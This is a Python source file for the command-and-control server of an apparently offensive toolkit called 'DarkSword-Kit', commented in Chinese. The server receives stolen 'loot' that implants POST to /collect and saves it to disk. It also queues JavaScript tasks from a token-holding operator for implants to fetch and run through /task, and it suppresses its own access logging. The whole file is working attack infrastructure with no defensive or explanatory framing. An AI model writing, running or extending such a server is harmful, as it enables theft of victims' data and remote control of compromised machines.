#!/usr/bin/env python3
"""c2/server.py — DarkSword-Kit 双向 C2（配置文件版）

接口:
    POST /collect   implant 回传战利品（JSON），落盘 loot_dir/
    GET  /task      implant 拉取队列中的 JS 任务（双向通道）
    POST /task      运维端推送 JS 任务进队列（需 X-Auth-Token）

用法:
    python3 c2/server.py [-c c2/c2_config.json]
"""
import argparse
import json
import queue
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE = Path(__file__).resolve().parent
DEFAULT_CFG = BASE / "c2_config.json"

CFG = {
    "listen_host": "0.0.0.0",
    "listen_port": 8443,
    "loot_dir": "loot",
    "shared_token": "TOKEN_PLACEHOLDER",
    "max_body_bytes": 8388608,
}
TASK_QUEUE: "queue.Queue[str]" = queue.Queue()
LOOT_DIR = Path("loot")


def load_config(path: Path) -> dict:
    cfg = dict(CFG)
    if path.exists():
        cfg.update(json.loads(path.read_text(encoding="utf-8")))
    return cfg


class C2Handler(BaseHTTPRequestHandler):
    def _send(self, code: int, body: bytes, ctype: str = "application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> bytes | None:
        length = int(self.headers.get("Content-Length", 0))
        if length < 0 or length > CFG["max_body_bytes"]:
            self._send(413, b'{"err":"body too large"}')
            return None
        return self.rfile.read(length) if length else b""

    # ---- implant -> C2 ----
    def do_POST(self):
        if self.path == "/collect":
            data = self._read_body()
            if data is None:
                return
            LOOT_DIR.mkdir(exist_ok=True)
            fname = LOOT_DIR / f"loot_{int(time.time())}.json"
            try:
                parsed = json.loads(data)
                fname.write_text(json.dumps(parsed, ensure_ascii=False, indent=2),
                                 encoding="utf-8")
                print(f"[c2] loot saved -> {fname}")
                self._send(200, b'{"ok":true}')
            except json.JSONDecodeError:
                fname.write_bytes(data)
                print(f"[c2] raw loot saved -> {fname}")
                self._send(200, b'{"ok":true,"note":"raw"}')
        elif self.path == "/task":
            if self.headers.get("X-Auth-Token") != CFG["shared_token"]:
                self._send(403, b'{"err":"bad token"}')
                return
            data = self._read_body()
            if data is None:
                return
            task = data.decode("utf-8", "replace")
            if not task.strip():
                self._send(400, b'{"err":"empty task"}')
                return
            TASK_QUEUE.put(task)
            print(f"[c2] task queued ({len(task)} bytes)")
            self._send(200, b'{"ok":true,"queued":1}')
        else:
            self._send(404, b'{"err":"not found"}')

    # ---- C2 -> implant ----
    def do_GET(self):
        if self.path != "/task":
            self._send(404, b'{"err":"not found"}')
            return
        try:
            task = TASK_QUEUE.get_nowait()
        except queue.Empty:
            task = ""  # 无任务：空响应
        self._send(200, task.encode("utf-8"), ctype="text/javascript")

    def log_message(self, fmt, *args):  # 静默默认访问日志
        pass


def main():
    ap = argparse.ArgumentParser(description="DarkSword-Kit minimal C2")
    ap.add_argument("-c", "--config", default=str(DEFAULT_CFG),
                    help="配置文件路径 (c2_config.json)")
    args = ap.parse_args()

    global LOOT_DIR
    cfg_path = Path(args.config)
    CFG.update(load_config(cfg_path))
    loot_dir = Path(CFG["loot_dir"])
    # 相对路径一律相对 server.py 所在目录解析，避免随进程 cwd 漂移
    LOOT_DIR = loot_dir if loot_dir.is_absolute() else (BASE / loot_dir)

    print(f"[c2] config={cfg_path}")
    print(f"[c2] listening on {CFG['listen_host']}:{CFG['listen_port']}"
          f"  (loot -> {LOOT_DIR}/)")
    server = ThreadingHTTPServer((CFG["listen_host"], CFG["listen_port"]),
                                 C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[c2] bye")


if __name__ == "__main__":
    main()
